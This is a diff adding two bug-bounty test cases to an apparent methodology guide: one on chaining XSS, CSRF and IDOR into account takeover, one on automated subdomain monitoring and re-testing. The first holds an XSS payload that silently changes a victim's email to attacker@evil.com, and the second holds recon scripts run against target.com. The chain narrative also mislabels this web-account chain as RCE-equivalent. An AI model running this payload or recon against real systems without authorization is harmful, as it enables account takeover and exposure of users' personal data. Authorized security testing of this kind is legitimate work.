@@ -474,3 +474,183 @@ For targets: implement asset inventory, monitor for subdomain takeover, disable 
 - [ ] Business impact analysis included (user count, data types, regulatory implications)
 - [ ] Severity justification explains any discrepancy between CVSS and program tier
 - [ ] Report includes severity section ready for triage reviewer
+
+---
+
+## TC-SBH-009: Vulnerability Chain Construction for Maximum Impact
+
+**Objective**: Validate that multiple lower-severity findings can be chained together to demonstrate a higher-severity impact, increasing the bounty payout and providing the vendor with a realistic attack narrative.
+
+**Severity**: HIGH
+
+**Prerequisites**:
+- Two or more confirmed vulnerabilities on the same target
+- Understanding of the application's authentication and authorization model
+- Ability to demonstrate each vulnerability independently
+- Access to the bounty program's payout matrix
+
+**Steps**:
+
+1. **Inventory all confirmed findings**
+   ```markdown
+   ## Finding Inventory
+   - F1: Reflected XSS in search parameter (Medium, CWE-79)
+   - F2: CSRF on email change endpoint (Medium, CWE-352)
+   - F3: IDOR in /api/v1/users/{id}/profile (High, CWE-639)
+   - F4: Open redirect on /login?redirect= (Low, CWE-601)
+   ```
+
+2. **Identify potential chains**
+   ```bash
+   # Map data flow between vulnerabilities
+   # Chain 1: Open Redirect → Phishing → Credential Capture → IDOR
+   # Chain 2: CSRF → Admin email change → Account takeover → Full data access
+   # Chain 3: XSS → Cookie theft → Authenticated session → IDOR data exfiltration
+   ```
+
+3. **Build the exploit chain**
+   ```python
+   #!/usr/bin/env python3
+   """Chain PoC: XSS + CSRF → Full Account Takeover"""
+   import requests
+
+   # Step 1: XSS payload that auto-triggers CSRF
+   xss_payload = """
+   <script>
+   fetch('/api/v1/account/email', {
+     method: 'POST',
+     headers: {'Content-Type': 'application/json'},
+     body: JSON.stringify({email: 'attacker@evil.com'}),
+     credentials: 'include'
+   });
+   </script>
+   """
+
+   # Step 2: Demonstrate the chained impact
+   # - Victim visits page with reflected XSS
+   # - XSS auto-triggers CSRF to change victim email
+   # - Attacker triggers password reset on the new email
+   # - Attacker gains full account access
+   # - From compromised account, IDOR exposes other users' PII
+
+   print("Chain impact: Unauthenticated → Full account takeover → Mass PII exposure")
+   ```
+
+4. **Document the chain with a visual attack flow**
+   ```markdown
+   ## Attack Chain Narrative
+
+   1. Attacker crafts URL with XSS payload: https://target.com/search?q=<XSS>
+   2. Victim clicks link; XSS executes in their browser session
+   3. XSS payload sends CSRF request to change account email
+   4. Attacker receives confirmation at attacker@evil.com
+   5. Attacker triggers password reset → full account takeover
+   6. Using compromised account, attacker exploits IDOR to access other users' PII
+   7. Total impact: Unauthenticated RCE chain equivalent
+
+   **Combined Severity**: CRITICAL (upgraded from Medium + Medium + High)
+   ```
+
+5. **Submit as a single chain report with independent findings as supplements**
+   - Lead report: The complete chain with CRITICAL severity
+   - Supplementary: Each individual finding can be reported separately if the chain is disputed
+   - Many programs pay the higher bounty for chained findings
+
+**Expected Result**: Complete attack chain documentation showing how individual findings combine to achieve critical impact, with a working PoC that demonstrates the full chain
+
+**Remediation**: For program maintainers: evaluate findings in the context of attack chains, not just individual severity; a fix for any link in the chain breaks the full exploit
+
+**Pass Criteria**:
+- [ ] At least two confirmed findings identified as chainable
+- [ ] Working PoC demonstrates the complete chain from start to finish
+- [ ] Visual attack flow diagram or narrative included in report
+- [ ] Combined severity correctly assessed and justified
+- [ ] Individual findings documented as backup if chain is disputed
+- [ ] Chain report submitted as primary, individual findings as supplements
+
+---
+
+## TC-SBH-010: Live Target Monitoring and Re-Testing
+
+**Objective**: Validate that a monitoring and re-testing pipeline correctly identifies new attack surfaces, patches of previously reported vulnerabilities, and regressions in deployed applications. Continuous monitoring maximizes long-term bounty earnings.
+
+**Severity**: MEDIUM
+
+**Prerequisites**:
+- Bug bounty program with an active development cycle
+- Previously submitted reports with known affected endpoints
+- Subdomain enumeration baseline from prior recon
+- Automated notification system (webhooks, cron jobs, or CI/CD)
+
+**Steps**:
+
+1. **Establish a baseline inventory**
+   ```bash
+   # Save current attack surface as baseline
+   subfinder -d target.com -all -silent | sort -u > baselines/subs_$(date +%Y%m%d).txt
+   httpx -l baselines/subs_$(date +%Y%m%d).txt -json -o baselines/live_$(date +%Y%m%d).json
+   nuclei -l baselines/live_$(date +%Y%m%d).json -t /Templates/ -o baselines/nuclei_$(date +%Y%m%d).txt
+   ```
+
+2. **Set up automated diff detection**
+   ```bash
+   #!/bin/bash
+   # recon-monitor.sh — Run weekly via cron
+   TODAY=$(date +%Y%m%d)
+   LAST=$(ls -t baselines/subs_*.txt | head -1 | grep -oP '\d{8}')
+
+   # Subdomain diff
+   subfinder -d target.com -all -silent | sort -u > "/tmp/subs_${TODAY}.txt"
+   NEW_SUBS=$(comm -13 "baselines/subs_${LAST}.txt" "/tmp/subs_${TODAY}.txt")
+
+   if [ -n "$NEW_SUBS" ]; then
+     echo "[NEW SUBDOMAINS DETECTED]" >> monitoring_log.txt
+     echo "$NEW_SUBS" >> monitoring_log.txt
+     httpx -l <(echo "$NEW_SUBS") -title -tech-detect -status-code >> new_assets.txt
+   fi
+   ```
+
+3. **Monitor technology changes on known assets**
+   ```bash
+   # Detect technology stack changes (new framework = new bugs)
+   httpx -l baselines/subs_latest.txt -tech-detect -json | \
+     jq -r '.url + " | " + (.tech // [] | join(", "))' > "/tmp/tech_${TODAY}.txt"
+
+   diff <(cut -d'|' -f2 baselines/tech_latest.txt | sort) \
+        <(cut -d'|' -f2 "/tmp/tech_${TODAY}.txt" | sort) | \
+     grep "^>" && echo "[TECHNOLOGY CHANGE DETECTED]"
+   ```
+
+4. **Re-test previously reported endpoints for regressions**
+   ```bash
+   # For each previously reported finding, test if it was properly fixed
+   while read -r endpoint payload expected; do
+     result=$(curl -s "https://target.com${endpoint}${payload}" | grep -c "error_pattern")
+     if [ "$result" -gt 0 ]; then
+       echo "[REGRESSION] $endpoint — previously fixed, now vulnerable again"
+     fi
+   done < previously_reported.txt
+   ```
+
+5. **Alert and prioritize new targets**
+   ```bash
+   # Notify on new attack surface discoveries
+   if [ -s new_assets.txt ]; then
+     # Send notification (adapt to your preferred method)
+     echo "New assets found: $(wc -l < new_assets.txt)" >> alerts.log
+     # Prioritize: new subdomains with admin/debug patterns get tested first
+     grep -iE "admin|debug|staging|dev|internal|api" new_assets.txt >> priority_targets.txt
+   fi
+   ```
+
+**Expected Result**: Automated monitoring pipeline that detects new subdomains, technology changes, endpoint additions, and regression vulnerabilities within 7 days of deployment
+
+**Remediation**: For program maintainers: publish a changelog or version endpoint so hunters can track updates; for hunters: always re-test after major version updates
+
+**Pass Criteria**:
+- [ ] Baseline inventory saved with timestamp for comparison
+- [ ] Automated diff detection runs on a regular schedule (weekly minimum)
+- [ ] New subdomains trigger immediate probing and technology fingerprinting
+- [ ] Previously reported endpoints re-tested for regressions after updates
+- [ ] Priority classification applied to new assets (admin/internal/debug get tested first)
+- [ ] Alerting mechanism notifies hunter of new opportunities without manual checking
